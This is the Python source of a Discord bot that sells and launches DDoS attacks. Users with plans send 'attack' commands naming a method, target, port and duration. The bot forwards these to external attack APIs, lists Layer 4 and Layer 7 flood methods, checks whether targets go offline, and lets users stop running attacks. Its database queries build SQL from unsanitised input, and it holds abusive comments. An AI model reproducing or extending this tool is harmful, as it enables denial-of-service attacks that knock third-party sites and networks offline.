import socket

print("Loading imports...")
import time
import asyncio
import json
import os
import discord
from colorama import Fore, init
from discord.ext import commands
from discord.ext.tasks import loop
import mysql.connector
import requests

print("Loaded imports...")
print("Connecting to database...")
config = {
    'host': 'localhost',
    'port': 3306,
    'user': 'root',
    'password': '',
    'database': 'tadashi',
    'raise_on_warnings': True
}
try:
    cnx = mysql.connector.connect(**config)
    cnx.autocommit = True
except ConnectionError:
    print("Unable to connect to database")
    exit(0)
print("Connected to database.")

@loop(count=None)
async def keep_sql():
    cursor = cnx.cursor()
    keepalive = "SELECT * FROM users"
    cursor.execute(keepalive)
    result = cursor.fetchall()
    print("Keeping mysql connection alive")
    time.sleep(60)


def getAllUsers():
    cursor = cnx.cursor()
    cursor.execute(f'SELECT tag, vip, ban FROM users')
    result = cursor.fetchall()
    results = []
    if result:
        for user in result:
            if user[1] == "true":
                if user[2] == "true":
                    results.append(f'{user[0]} (VIP) (BANNED)')
                elif user[2] == "false":
                    results.append(f'{user[0]} (VIP)')
            elif user[2] == "true":
                results.append(f'{user[0]} (BANNED)')
            else:
                results.append(f'{user[0]}')
        cursor.close()
        return str(results).replace("[", "").replace("]", "").replace("'", "").replace(",", "\n")
    else:
        cursor.close()
        return False


def getUser(id):
    cursor = cnx.cursor()
    cursor.execute(f'SELECT * FROM users WHERE id = {id}')
    result = cursor.fetchall()
    if result:
        cursor.close()
        return True
    else:
        cursor.close()
        return False


def getUserMaxtime(id):
    cursor = cnx.cursor()
    cursor.execute(f'SELECT maxtime FROM users WHERE id = {id}')
    result = cursor.fetchall()
    return result[0][0]


def isBanned(id):
    cursor = cnx.cursor()
    cursor.execute(f'SELECT ban FROM users WHERE id = {id}')
    result = cursor.fetchall()
    return f"{result[0][0]}"


def addUser(user, maxtime, vip):
    cursor = cnx.cursor()
    try:
        cursor.execute(
            f"INSERT INTO users(id, tag, maxtime, vip, ban) VALUES ({user.id}, '{user}', {maxtime}, '{vip}', 'false')")
        cnx.commit()
        cursor.close()
        return True
    except:
        cursor.close()
        return False


def editUser(id, maxtime=50, vip="false"):
    cursor = cnx.cursor()
    try:
        cursor.execute(f'UPDATE users SET maxtime={maxtime}, vip="{vip}" WHERE id = {id}')
        cnx.commit()
        cursor.close()
        return True
    except Exception as error:
        print(error)
        return False


def banUser(id):
    cursor = cnx.cursor()
    try:
        cursor.execute(f'UPDATE users SET ban="true" WHERE id = {id}')
        cnx.commit()
        cursor.close()
        return True
    except:
        return False


def unbanUser(id):
    cursor = cnx.cursor()
    try:
        cursor.execute(f'UPDATE users SET ban="false" WHERE id = {id}')
        cnx.commit()
        cursor.close()
        return True
    except:
        return False


def delUser(id):
    cursor = cnx.cursor()
    try:
        cursor.execute(f"DELETE FROM users WHERE id = {id}")
        cnx.commit()
        cursor.close()
        return True
    except:
        return False


admins = [123, 456] # put admin ids here
with open('methods.json', 'r') as methods_list:
    methods_list = json.load(methods_list)

with open("apis.json", "r") as apis:
    apis = json.load(apis)

init(convert=False)

t = time.localtime()
current_time = time.strftime("%H:%M:%S", t)
start_time = time.time()


def clear():
    os.system('cls' if os.name == 'nt' else 'clear')


clear()
embed_color = 000000
prefix = "dedoze "
version = 1.3

bot = commands.Bot(command_prefix=prefix)
bot.remove_command('help')


def restartbot():
    os.system("python Bot.py")


for api, details in apis.items():
    global max_time
    max_time = int(apis[api]["max_time"])


@bot.event
async def on_message(message):
    if not message.guild:
        return
    else:
        await bot.process_commands(message)


@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Game(name="wit my booduhs"))
    print("")
    print(Fore.LIGHTRED_EX + "     Status: " + Fore.GREEN + "CONNECTED")
    print(Fore.LIGHTRED_EX + "     Account: " + Fore.LIGHTWHITE_EX + bot.user.name)
    print(Fore.LIGHTRED_EX + "     ID: " + Fore.LIGHTWHITE_EX + str(bot.user.id))
    print(Fore.LIGHTRED_EX + "     Server-Count: " + Fore.LIGHTWHITE_EX + "" + str(len(bot.guilds)) + "")
    print("")
    keep_sql.start()


@bot.command()
async def help(ctx):
    embed = discord.Embed(description=f"\n {prefix}iplookup <ip> | information regarding specified ip address"
                                      f"\n {prefix}methods | list of methods for attacking L4 & L7 infrastructures"
                                      f"\n {prefix}attack <method> <target> <port> <time>"
                                      f"\n {prefix}webping <domain> | ping website yes."
                                      f"\n {prefix}ping <ip> | ping ip address yes."
                                      f"\n {prefix}ongoing | shows ongoing attack"
                                      f"\n {prefix}stopattack | stops a ongoing attack"
                                      f"\n {prefix}ban <@user> | bans user from using commands"
                                      f"\n {prefix}unban | unbans user"
                                      f"\n {prefix}edituser <@user> [maxtime 100] [vip true or false] | edits a user's plan"
                                      f"\n {prefix}add <@user> | adds a user to the database"
                                      f"\n {prefix}remove <@user> | removes a user to the database"
                                      f"\n {prefix}list | shows list of users in the database"
                                      f"\n {prefix}restart | retstarts the bot"
                                      f"\n {prefix}plan | shows your plan.", color=embed_color)
    await ctx.send(embed=embed)


@bot.command()
async def plan(ctx):
    if getUser(ctx.author.id):
        cursor = cnx.cursor()
        cursor.execute(f'SELECT * FROM users WHERE id = {ctx.author.id}')
        result = cursor.fetchall()
        id = result[0][0]
        tag = result[0][1]
        maxtime = result[0][2]
        vip = result[0][3]
        banned = result[0][4]
        embed = discord.Embed(description=
                              f"ID: {id}\n"
                              f"Tag: {tag}\n"
                              f"Max Time: {maxtime}\n"
                              f"VIP: {vip}\n"
                              f"Banned: {banned}\n", color=embed_color)
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(description=f"Unable to find {ctx.author.mention}", color=embed_color)
        await ctx.send(embed=embed)


@bot.command()
async def methods(ctx):
    if isBanned(ctx.author.id) == "true":
        embed = discord.Embed(description=f"You are banned.", color=embed_color)
        await ctx.send(embed=embed)
        return
    methods_description = []
    for method, details in methods_list.items():
        if details['enabled']:
            if details['vip']:
                methods_description.append(
                    f"({details['layer']}) ({details['type']}) .attack {method} [VIP] target port time")
            else:
                methods_description.append(
                    f"({details['layer']}) ({details['type']}) .attack {method} target port time")
    description = (str(methods_description).replace("[", "").replace("]", "").replace("'", "").replace(",", "\n"))
    embed = discord.Embed(title="Methods", description=description, color=embed_color)
    await ctx.send(embed=embed)


@bot.command()
async def ban(ctx, user: discord.Member = None):
    if ctx.author.id not in admins:
        embed = discord.Embed(title=f"Insufficient permissions", color=embed_color)
        await ctx.send(embed=embed)

    elif user is None:
        embed = discord.Embed(title=f"Please select a user", description=f"Example: {prefix}ban <@User>",
                              color=embed_color)
        await ctx.send(embed=embed)

    else:
        if getUser(user.id):
            try:
                if isBanned(user.id) == "false":
                    banUser(user.id)
                    embed = discord.Embed(description=f"Successfully banned {user}",
                                          color=embed_color)
                    await ctx.send(embed=embed)
                else:
                    embed = discord.Embed(description=f"{user} is already banned.",
                                          color=embed_color)
                    await ctx.send(embed=embed)
            except:
                embed = discord.Embed(description=f"Unable to find {user}", color=embed_color)
                await ctx.send(embed=embed)
        else:
            embed = discord.Embed(description=f"Unable to find {user}", color=embed_color)
            await ctx.send(embed=embed)


@bot.command()
async def unban(ctx, user: discord.Member = None):
    if ctx.author.id not in admins:
        embed = discord.Embed(title=f"Insufficient permissions", color=embed_color)
        await ctx.send(embed=embed)

    elif user is None:
        embed = discord.Embed(title=f"Please select a user", description=f"Example: {prefix}unban <@User>",
                              color=embed_color)
        await ctx.send(embed=embed)

    else:
        if getUser(user.id):
            try:
                if isBanned(user.id) == "true":
                    unbanUser(user.id)
                    embed = discord.Embed(description=f"Successfully unbanned {user}",
                                          color=embed_color)
                    await ctx.send(embed=embed)
                else:
                    embed = discord.Embed(description=f"{user} isn't banned.",
                                          color=embed_color)
                    await ctx.send(embed=embed)
            except:
                embed = discord.Embed(description=f"Unable to find {user}", color=embed_color)
                await ctx.send(embed=embed)
        else:
            embed = discord.Embed(description=f"Unable to find {user}", color=embed_color)
            await ctx.send(embed=embed)


@bot.command()
async def edituser(ctx, user: discord.Member = None, maxtime: int = 50, vip="false"):
    if ctx.author.id not in admins:
        embed = discord.Embed(title=f"Insufficient permissions", color=embed_color)
        await ctx.send(embed=embed)

    elif user is None:
        embed = discord.Embed(title=f"Please select a user",
                              description=f"Example: {prefix}edituser <@User> [maxtime 100] [vip true or false]",
                              color=embed_color)
        await ctx.send(embed=embed)

    else:
        if getUser(user.id):
            try:
                editUser(user.id, maxtime, vip)
                embed = discord.Embed(description=f"Successfully edited {user}", color=embed_color)
                await ctx.send(embed=embed)
            except:
                embed = discord.Embed(description=f"Unable to edit {user}", color=embed_color)
                await ctx.send(embed=embed)
        else:
            embed = discord.Embed(description=f"Unable to find {user}", color=embed_color)
            await ctx.send(embed=embed)


@bot.command()
async def add(ctx, user: discord.Member = None, maxtime: int = 50, vip="false"):
    if ctx.author.id not in admins:
        embed = discord.Embed(title=f"Insufficient permissions", color=embed_color)
        await ctx.send(embed=embed)

    elif user is None:
        embed = discord.Embed(title=f"Please select a user",
                              description=f"Example: {prefix}add <@User> [maxtime 100] [vip true or false]",
                              color=embed_color)
        await ctx.send(embed=embed)

    else:
        if not getUser(user.id):
            try:
                addUser(user, maxtime, vip)
                embed = discord.Embed(description=f"Successfully added {user}", color=embed_color)
                await ctx.send(embed=embed)
            except:
                embed = discord.Embed(description=f"Unable to add {user}", color=embed_color)
                await ctx.send(embed=embed)
        else:
            embed = discord.Embed(description=f"{user} is already on file.",
                                  color=embed_color)
            await ctx.send(embed=embed)


@bot.command()
async def remove(ctx, user: discord.Member = None):
    if ctx.author.id not in admins:
        embed = discord.Embed(title=f"Insufficient permissions", color=embed_color)
        await ctx.send(embed=embed)

    elif user is None:
        embed = discord.Embed(title=f"Please select a user", description=f"Example: {prefix}remove <@User>",
                              color=embed_color)
        await ctx.send(embed=embed)

    else:
        if getUser(user.id):
            try:
                delUser(user.id)
                embed = discord.Embed(description=f"Successfully removed {user}",
                                      color=embed_color)
                await ctx.send(embed=embed)
            except:
                embed = discord.Embed(description=f"Unable to find {user}", color=embed_color)
                await ctx.send(embed=embed)
        else:
            embed = discord.Embed(description=f"Unable to find {user}", color=embed_color)
            await ctx.send(embed=embed)


@bot.command()
async def iplookup(ctx, *, ipaddress):
    if isBanned(ctx.author.id) == "true":
        embed = discord.Embed(description=f"You are banned.", color=embed_color)
        await ctx.send(embed=embed)
        return
    p = requests.post('http://ip-api.com/json/' + ipaddress)
    if '"status":"success"' in p.text:
        embed = discord.Embed(description=f"IP | **{ipaddress}**\n"
                                          f" Country | **{p.json()['country']}**\n"
                                          f" Country Code | **{p.json()['countryCode']}**\n"
                                          f" Region | **{p.json()['region']}**\n"
                                          f" Region Name | **{p.json()['regionName']}**\n"
                                          f" City | **{p.json()['city']}**\n"
                                          f" Timezone | **{p.json()['timezone']}**\n"
                                          f" Zip | **{p.json()['zip']}**\n"
                                          f" ISP | **{p.json()['isp']}**",
                              color=embed_color)
        await ctx.send(embed=embed)
    else:
        em = discord.Embed(title="Invalid IP", description="You have entered an invalid ip address.", color=embed_color)
        await ctx.send(embed=em)


@bot.command()
async def ping(ctx, ip=None):
    if isBanned(ctx.author.id) == "true":
        embed = discord.Embed(description=f"You are banned.", color=embed_color)
        await ctx.send(embed=embed)
        return
    if ip is None:
        embed = discord.Embed(title=f"Please select a IP",
                              description=f"Example: {prefix}ping 1.1.1.1",
                              color=embed_color)
        await ctx.send(embed=embed)
        return
    try:
        socket.setdefaulttimeout(3)
        ip = socket.gethostbyname(ip)
        embed = discord.Embed(description=f"Target is online.", color=embed_color)
        await ctx.send(embed=embed)
    except:
        embed = discord.Embed(description=f"Target is offline.", color=embed_color)
        await ctx.send(embed=embed)


@bot.command()
async def webping(ctx, website=None): # quite shit ngl - rith, kys - flairings
    if isBanned(ctx.author.id) == "true":
        embed = discord.Embed(description=f"You are banned.", color=embed_color)
        await ctx.send(embed=embed)
        return
    if website is None:
        embed = discord.Embed(title=f"Please select a website",
                              description=f"Example: {prefix}webping https://google.com/",
                              color=embed_color)
        await ctx.send(embed=embed)
    try:
        requests.get(f"{website}", timeout=15)
    except requests.exceptions.RequestException as e:
        embed = discord.Embed(description=f"Target is offline.", color=embed_color)
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(description=f"Target is online.", color=embed_color)
        await ctx.send(embed=embed)


@bot.command()
async def list(ctx):
    if ctx.author.id not in admins:
        embed = discord.Embed(title=f"Insufficient permissions", color=embed_color)
        await ctx.send(embed=embed)
    else:
        try:
            embed = discord.Embed(description=f"{getAllUsers()}", color=embed_color)
            await ctx.send(embed=embed)
        except Exception as e:
            embed = discord.Embed(description=f"Exception: {e}", color=embed_color)
            await ctx.send(embed=embed)


@bot.command()
async def attack(ctx, method: str = None, target: str = None, port: str = None, time: str = None):
    if not getUser(ctx.author.id):
        embed = discord.Embed(title=f"Insufficient permissions", color=embed_color)
        await ctx.send(embed=embed)

    elif isBanned(ctx.author.id) == "true":
        embed = discord.Embed(description=f"You are banned.", color=embed_color)
        await ctx.send(embed=embed)

    elif method is None:
        embed = discord.Embed(title=f"Please select a method", color=embed_color)
        embed.set_footer(text=f"{prefix}attack <method> <target> <port> <time>")
        await ctx.send(embed=embed)

    elif method not in methods_list:
        embed = discord.Embed(title=f"Invalid method", color=embed_color)
        embed.set_footer(text=f"{prefix}attack <method> <target> <port> <time>")
        await ctx.send(embed=embed)

    elif target is None:
        embed = discord.Embed(title=f"Please select a target", color=embed_color)
        embed.set_footer(text=f"{prefix}attack <method> <target> <port> <time>")
        await ctx.send(embed=embed)

    elif port is None:
        embed = discord.Embed(title=f"Please select a port", color=embed_color)
        embed.set_footer(text=f"{prefix}attack <method> <target> <port> <time>")
        await ctx.send(embed=embed)

    elif time is None:
        embed = discord.Embed(title=f"Please select a time", color=embed_color)
        embed.set_footer(text=f"{prefix}attack <method> <target> <port> <time>")
        await ctx.send(embed=embed)

    elif int(time) > getUserMaxtime(ctx.author.id):
        embed = discord.Embed(title=f"Your max time is {getUserMaxtime(ctx.author.id)}", color=embed_color)
        await ctx.send(embed=embed)
    else:
        for api, details in apis.items():
            try:
                api_url = apis[api]["api_url"]
                max_time = int(apis[api]["max_time"])

                if int(time) > max_time:
                    time2 = max_time
                else:
                    time2 = int(time)

                attack_info = requests.get(
                    f"{api_url}".replace("{time}", f"{time}").replace("{port}", f"{port}").replace("{method}",
                                                                                                   f"{method}").replace(
                        "{target}", f"{target}"))
                json_response = attack_info.json()
                if json_response['error'] == "true":
                    embed = discord.Embed(title="**API ERROR**", description=f"{json_response['message']}",
                                          color=embed_color)
                    await ctx.send(embed=embed)
                else:
                    embed = discord.Embed(description=f"Your attack has been successfully sent", color=embed_color)
                    embed.set_image(url="https://i.giphy.com/media/HhTXt43pk1I1W/200.gif")
                    await ctx.send(embed=embed)
                    print(
                        f"\n {Fore.LIGHTWHITE_EX}{current_time} | {Fore.BLUE}[ATTACK] {Fore.LIGHTWHITE_EX}{method.upper()} attack has been sent by {ctx.author} for {time} seconds to {target}")
                    if target.__contains__("http"):  # L7 PING
                        try:
                            await asyncio.sleep(6)
                            requests.get(f"{target}", timeout=15)
                        except requests.exceptions.RequestException as e:
                            embed = discord.Embed(description=f"Target timed out.", color=embed_color)
                            await ctx.send(embed=embed)
                        else:
                            embed = discord.Embed(description=f"Target did not time out.", color=embed_color)
                            await ctx.send(embed=embed)
                    else:  # L4 PING
                        print("gay")
            except Exception as e:
                pass


@bot.command()
async def ongoing(ctx):
    if isBanned(ctx.author.id) == "true":
        embed = discord.Embed(description=f"You are banned.", color=embed_color)
        await ctx.send(embed=embed)
        return
    r = requests.get("https://api.com/running?key=v-funuw")
    for field in r.json()['attacks']:
        method = field['method']
        host = field['host']
        port = field['port']
        time = field['time']
        expires = field['expires']
    if "expires" in r.text:
        embed = discord.Embed(title=host, color=embed_color)
        embed.add_field(name="Method:", value=f"{method}", inline=True)
        embed.add_field(name="Port:", value=f"{port}", inline=True)
        embed.add_field(name="Time:", value=f"{time}", inline=True)
        embed.add_field(name="Expires:", value=f"{expires}", inline=True)
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(description=f"There are currently no ongoing attacks.", color=embed_color)
        await ctx.send(embed=embed)


@bot.command()
async def stopattack(ctx):
    if isBanned(ctx.author.id) == "true":
        embed = discord.Embed(description=f"You are banned.", color=embed_color)
        await ctx.send(embed=embed)
        return
    r = requests.get("https://api.com/running?key=v-funuw")
    for field in r.json()['attacks']:
        host = field['host']
        port = field['port']
        time = field['time']
    if "expires" in r.text:
        p = requests.get(f"https://api.com/api?key=v-funuw&host={host}&port={port}&time={time}&method"
                         f"=stop")
        if "No attack found." in p.text:
            embed = discord.Embed(description=f"There are currently no ongoing attacks.", color=embed_color)
            await ctx.send(embed=embed)
            return
        elif "Attack has been stopped.":
            embed = discord.Embed(description=f"Attack has been stopped.", color=embed_color)
            await ctx.send(embed=embed)
            return
    else:
        embed = discord.Embed(description=f"There are currently no ongoing attacks.", color=embed_color)
        await ctx.send(embed=embed)


@bot.command()
async def restart(ctx):
    if ctx.author.id not in admins:
        embed = discord.Embed(title=f"Insufficient permissions", color=embed_color)
        await ctx.send(embed=embed)
    else:
        try:
            restartbot()
        except Exception as e:
            embed = discord.Embed(description=f"Exception: {e}", color=embed_color)
            await ctx.send(embed=embed)


bot.run("token")
